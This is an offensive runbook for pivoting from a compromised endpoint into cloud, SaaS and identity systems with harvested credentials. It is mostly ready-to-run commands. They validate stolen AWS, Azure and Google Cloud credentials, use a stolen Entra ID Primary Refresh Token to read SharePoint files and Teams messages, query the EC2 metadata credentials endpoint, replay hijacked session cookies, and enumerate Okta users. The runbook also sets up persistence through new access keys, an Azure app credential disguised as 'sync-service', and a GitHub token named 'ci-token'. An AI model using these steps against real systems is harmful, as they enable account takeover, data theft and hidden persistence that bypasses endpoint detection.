# Runbook: Pivot from endpoint to cloud

## Objective

Use credential and token material harvested from the endpoint to access cloud resources, SaaS platforms, and identity infrastructure from attacker-controlled infrastructure, leaving the endpoint behind.

## Validate harvested cloud tokens

Test each set of extracted credentials before the engagement window closes:

```bash
# AWS
aws --profile harvested sts get-caller-identity
aws --profile harvested iam list-attached-user-policies --user-name <username>

# Azure CLI token
az account show
az role assignment list --assignee <user-object-id> --all

# Google Cloud
gcloud config set account <email>
gcloud auth list
gcloud projects list
```

Note the identity, the roles attached to it, and what resources it can access. This determines the next escalation path.

## Entra ID / Microsoft 365

With a Primary Refresh Token extracted from the endpoint:

```powershell
# Get access tokens for specific Microsoft services
$token = Get-AADIntAccessTokenForMSGraph -PRTToken $prt
$teamsToken = Get-AADIntAccessTokenForTeams -PRTToken $prt
$sharePointToken = Get-AADIntAccessTokenForSPO -PRTToken $prt

# Access SharePoint files
Get-AADIntSharePointFiles -AccessToken $sharePointToken -SiteURL https://tenant.sharepoint.com/sites/internal

# Read Teams messages
Get-AADIntTeamsMessages -AccessToken $teamsToken | Select-Object -First 50
```

With an access token for Microsoft Graph:

```bash
# Enumerate the user's accessible resources
curl -H "Authorization: Bearer $token" \
  'https://graph.microsoft.com/v1.0/me'

curl -H "Authorization: Bearer $token" \
  'https://graph.microsoft.com/v1.0/me/drive/root/children'

# List joined groups and roles
curl -H "Authorization: Bearer $token" \
  'https://graph.microsoft.com/v1.0/me/memberOf'
```

## AWS escalation

With harvested AWS credentials, enumerate permissions and escalate:

```bash
# Enumerate current identity and policies
aws sts get-caller-identity
aws iam get-user
aws iam list-attached-user-policies --user-name <user>
aws iam list-user-policies --user-name <user>

# Check for privilege escalation paths with Pacu or Enumerate-IAM
python3 enumerate-iam.py --access-key <key> --secret-key <secret>

# Common escalation: create new access keys for a more privileged user
aws iam create-access-key --user-name <admin-user>

# Access EC2 instance metadata if an instance is accessible
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## SaaS session hijacking

Import harvested browser session cookies into the attacker's browser:

```bash
# Using the browser's developer tools or cookie-editor extension
# Verify the session is still valid
curl -b "session=<value>; csrf=<value>" \
  -H "X-Csrf-Token: <csrf-value>" \
  https://app.target.com/api/user/profile

# Common high-value targets:
# - GitHub: read repositories, secrets, Actions workflows
# - Slack: read messages, download files, enumerate users
# - Jira/Confluence: read internal documentation
# - Okta admin console: if the user has admin rights, enumerate users and reset credentials
```

## Okta and SSO federation

If the user has Okta access, their session cookie or API token can be used to issue new sessions:

```bash
# Verify Okta session
curl -H "Authorization: SSWS <api-token>" \
  https://target.okta.com/api/v1/users/me

# List applications accessible via SSO
curl -H "Authorization: SSWS <api-token>" \
  https://target.okta.com/api/v1/apps

# If admin: list all users
curl -H "Authorization: SSWS <api-token>" \
  'https://target.okta.com/api/v1/users?limit=200'
```

## Maintaining cloud access independently of the endpoint

Once cloud access is established from attacker infrastructure, create a persistence mechanism that does not depend on the compromised endpoint:

```bash
# AWS: create a new access key pair
aws iam create-access-key --user-name <target-user>

# Azure: register a new application and create a credential
az ad app create --display-name "sync-service"
az ad app credential reset --id <app-id> --append

# GitHub: create a personal access token via the API
curl -H "Authorization: token <session-token>" \
  -d '{"note":"ci-token","scopes":["repo","workflow"]}' \
  https://api.github.com/authorizations
```

At this point the endpoint can be abandoned. Detection depends on the identity layer, not the device.
